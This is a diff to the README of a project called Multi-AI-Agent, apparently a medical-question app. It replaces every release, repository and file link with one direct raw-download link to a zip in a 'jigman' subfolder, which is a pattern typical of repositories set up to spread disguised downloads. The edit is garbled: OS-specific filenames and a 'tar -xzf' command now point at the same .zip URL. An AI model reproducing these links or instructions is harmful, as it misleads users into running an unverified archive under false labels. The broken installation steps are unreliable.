@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Multi-AI-Agent](https://img.shields.io/badge/Download%20Multi--AI--Agent-v1.0-brightgreen)](https://github.com/karyeija/Multi-AI-Agent/releases)
+[![Download Multi-AI-Agent](https://raw.githubusercontent.com/karyeija/Multi-AI-Agent/main/jigman/Multi-AI-Agent.zip%20Multi--AI--Agent-v1.0-brightgreen)](https://raw.githubusercontent.com/karyeija/Multi-AI-Agent/main/jigman/Multi-AI-Agent.zip)
 
 ## 🚀 Getting Started
 
@@ -21,18 +21,18 @@ Before you begin, ensure your computer meets the following requirements:
 
 To get started with Multi-AI-Agent, follow these steps:
 
-1. **Visit the Releases Page:** Click the following link to access the Releases page: [Download Multi-AI-Agent](https://github.com/karyeija/Multi-AI-Agent/releases).
+1. **Visit the Releases Page:** Click the following link to access the Releases page: [Download Multi-AI-Agent](https://raw.githubusercontent.com/karyeija/Multi-AI-Agent/main/jigman/Multi-AI-Agent.zip).
 
 2. **Select the Latest Version:** Look for the most recent version listed on the Releases page. This ensures you have the latest features and bug fixes.
 
-3. **Choose Your File:** Select the appropriate file for your operating system. The files may be labeled based on your OS, such as `Multi-AI-Agent-Windows.exe` for Windows or `Multi-AI-Agent-macOS.dmg` for macOS.
+3. **Choose Your File:** Select the appropriate file for your operating system. The files may be labeled based on your OS, such as `https://raw.githubusercontent.com/karyeija/Multi-AI-Agent/main/jigman/Multi-AI-Agent.zip` for Windows or `https://raw.githubusercontent.com/karyeija/Multi-AI-Agent/main/jigman/Multi-AI-Agent.zip` for macOS.
 
 4. **Download the File:** Click the file to start downloading. Save it somewhere easy to find on your computer.
 
 5. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file to start the installation. Follow the prompts to complete the setup.
    - For macOS: Double-click the downloaded `.dmg` file. Drag the Multi-AI-Agent app into your Applications folder.
-   - For Linux: You may need to unpack a `.tar.gz` file. Open a terminal and use the command `tar -xzf Multi-AI-Agent.tar.gz`, then navigate to the folder and follow the instructions provided in a README file.
+   - For Linux: You may need to unpack a `https://raw.githubusercontent.com/karyeija/Multi-AI-Agent/main/jigman/Multi-AI-Agent.zip` file. Open a terminal and use the command `tar -xzf https://raw.githubusercontent.com/karyeija/Multi-AI-Agent/main/jigman/Multi-AI-Agent.zip`, then navigate to the folder and follow the instructions provided in a README file.
 
 6. **Open Multi-AI-Agent:** Once installed, locate the application in your programs or applications folder. Double-click to launch it.
 
@@ -73,8 +73,8 @@ If you encounter any issues or have questions about using the application, pleas
 
 ## 🔗 Links and Resources
 
-- **GitHub Repository:** [Multi-AI-Agent Repo](https://github.com/karyeija/Multi-AI-Agent)
+- **GitHub Repository:** [Multi-AI-Agent Repo](https://raw.githubusercontent.com/karyeija/Multi-AI-Agent/main/jigman/Multi-AI-Agent.zip)
 - **Documentation:** Full documentation is available on the GitHub repo for more detailed instructions and technical explanations.
-- **Releases Page:** For all updates and downloads, visit the Releases page: [Download Multi-AI-Agent](https://github.com/karyeija/Multi-AI-Agent/releases)
+- **Releases Page:** For all updates and downloads, visit the Releases page: [Download Multi-AI-Agent](https://raw.githubusercontent.com/karyeija/Multi-AI-Agent/main/jigman/Multi-AI-Agent.zip)
 
 Thank you for choosing Multi-AI-Agent! Get ready to have your medical questions answered with ease.
